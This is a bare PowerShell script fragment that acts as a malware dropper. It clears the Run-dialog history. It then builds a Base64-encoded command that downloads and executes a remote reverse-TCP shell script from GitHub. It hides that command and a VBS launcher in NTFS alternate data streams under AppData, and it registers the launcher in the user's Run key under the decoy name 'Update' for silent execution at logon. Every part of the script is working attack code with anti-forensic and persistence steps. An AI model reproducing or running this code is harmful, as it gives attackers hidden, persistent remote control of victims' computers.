    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
    $PayloadURL = 'https://raw.githubusercontent.com/syntax3043/Powershell_rev_tcp/master/PS_rev_tcp_source.ps1'


    $TextfileName = [System.IO.Path]::GetRandomFileName() + ".txt"
    $textFile = $TextfileName -split '\.',([regex]::matches($TextfileName,"\.").count) -join ''
    $VBSfileName = [System.IO.Path]::GetRandomFileName() + ".vbs"
    $vbsFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''

    $payloadParameters = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL')); $Arguments"
    $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payloadParameters))
    $payload = "powershell.exe -ep Bypass -noexit -enc $encodedPayload"

    $vbstext1 = "Dim objShell"
    $vbstext2 = "Set objShell = WScript.CreateObject(""WScript.Shell"")"
    $vbstext3 = "command = ""cmd /C for /f """"delims=,"""" %i in ($env:UserProfile\AppData:$textFile) do %i"""
    $vbstext4 = "objShell.Run command, 0"
    $vbstext5 = "Set objShell = Nothing"
    $vbText = $vbstext1 + ":" + $vbstext2 + ":" + $vbstext3 + ":" + $vbstext4 + ":" + $vbstext5

    $CreatePayloadADS = {cmd /C "echo $payload > $env:USERPROFILE\AppData:$textFile"}
    $CreateWrapperADS = {cmd /C "echo $vbtext > $env:USERPROFILE\AppData:$vbsFile"}
    Invoke-Command -ScriptBlock $CreatePayloadADS
    Invoke-Command -ScriptBlock $CreateWrapperADS

    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
    
